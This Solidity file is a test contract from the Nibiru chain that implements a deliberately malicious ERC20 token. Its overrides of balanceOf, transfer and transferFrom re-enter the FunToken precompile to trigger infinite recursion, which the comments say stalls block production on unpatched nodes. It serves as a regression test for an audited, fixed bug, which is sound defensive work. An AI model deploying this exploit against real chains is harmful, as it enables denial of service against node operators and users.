// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IFunToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @title TestInfiniteRecursionERC20
/// @notice Malicious ERC20 used to demonstrate the "infinite recursion via
/// FunToken precompile" attack. Mitigated from audit ticket:
/// https://github.com/code-423n4/2024-11-nibiru-findings/issues/4
///
/// @dev Usage
/// 1) Deploy this contract with name/symbol. The constructor mints test supply
///    to the deployer so you can drive calls immediately. (See constructor.)
///
/// 2) To exercise the “query → reenter → query” recursion:
///    - Call `attackBalance()`. Internally, this triggers `balanceOf(who)` which
///      performs a low-level static call to the FunToken precompile
///      `balance(address erc20, address account)` at the precompile address,
///      passing `(address(this), who)`.
///      • Relevant code: the `balanceOf` override issues
///        `staticcall(abi.encodeWithSignature("balance(address,address)", ...))`,
///        which re-enters the precompile’s `balance` path.
///      • On the precompile side, `balance` calls into the keeper:
///        `evmKeeper.ERC20().BalanceOf(...)`, which (pre-fix) used a hardcoded
///        100_000 gas budget via `Erc20GasLimitQuery`, breaking EIP-150’s 63/64
///        invariant and enabling unbounded recursion.
///      • Expected in tests: recursion leading to OOG/hang on vulnerable builds;
///        with the 63/64 clamp fix applied, the call fails fast/bounds recursion.
///
/// 3) To exercise the “transfer → reenter → transfer” recursion:
///    - Call `attackTransfer()`. This drives the precompile’s
///      `sendToBank(erc20, amount, to)` path, which invokes the keeper’s
///      `ERC20().Transfer(...)` under the hood.
///    - The attack variant of `transfer` (as shown in the notes) performs a
///      low-level call back into `sendToBank` during `transfer`, creating the
///      precompile → ERC20 → precompile loop. Use the snippet provided in the
///      notes for the malicious `transfer` body when you want to test this path.
///
///
/// 4) What to assert
///    - For the `balanceOf` vector (`attackBalance()`): node enters recursive
///      calls via the keeper’s `LoadERC20BigInt`/`CallContract` with fixed gas
///      (vulnerable), or halts recursion with the 63/64 clamp (patched).
///    - For the `transfer` vector (`attackTransfer()`): on vulnerable builds, the
///      loop quickly eats memory and stalls block production; with the fix, the
///      call should fail fast or complete without unbounded reentry.
contract TestInfiniteRecursionERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 //decimals_
    ) ERC20(_name, _symbol) {
        _mint(msg.sender, 1000000 * 10 ** 18);
    }

    // Attack Vector 1: recurse via IFunToken.balance()
    function balanceOf(
        address who
    ) public view virtual override returns (uint256) {
        // Re-enter the precompile which re-enters us again.
        // Return value ignored; the point is the recursion.
        // staticcall is acceptable for view.
        // solhint-disable-next-line avoid-low-level-calls
        //
        // recurse through funtoken.balance(who, address(this))
        // (erc20=this, account=who). Force recursion via `balanceOf`.
        (bool ok, bytes memory ret) = address(FUNTOKEN_PRECOMPILE_ADDRESS)
            .staticcall(
                abi.encodeWithSignature(
                    "balance(address,address)",
                    // IFunToken.balance(who address, funtoken address)
                    who,
                    address(this)
                )
            );
        // silence unused. Ignore failures for testing purposes.
        ok;
        ret;
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        // We never reach here on the vulnerable node before recursion
        // exhausts resources.
        return 0;
    }

    /// Vector 2: recurse via sendToBank() → ERC20.transfer → (this) transfer → sendToBank() ...
    /// @notice Override both transfer and transferFrom to re-enter the
    /// precompile.
    function transfer(
        address, // to
        uint256 amount
    ) public override returns (bool) {
        // recurse through funtoken sendToBank
        FUNTOKEN_PRECOMPILE.sendToBank(
            address(this),
            amount,
            "nibi1zaavvzxez0elundtn32qnk9lkm8kmcsz44g7xl" // does not matter, it's not reached
        );
        return true;
    }

    /// @notice Override both transfer and transferFrom to re-enter the
    /// precompile.
    function transferFrom(
        address, // from
        address, // to
        uint256 amount
    ) public override returns (bool) {
        // recurse through funtoken sendToBank
        FUNTOKEN_PRECOMPILE.sendToBank(
            address(this),
            amount,
            "nibi1zaavvzxez0elundtn32qnk9lkm8kmcsz44g7xl" // does not matter, it's not reached
        );
        return true;
    }

    /// Test helper to attack the chain with a query
    function attackBalance() public view {
        balanceOf(address(0));
    }

    /// Test helper to attack the chain with a transfer tx
    function attackTransfer() public {
        transfer(address(0), 1);
    }
}
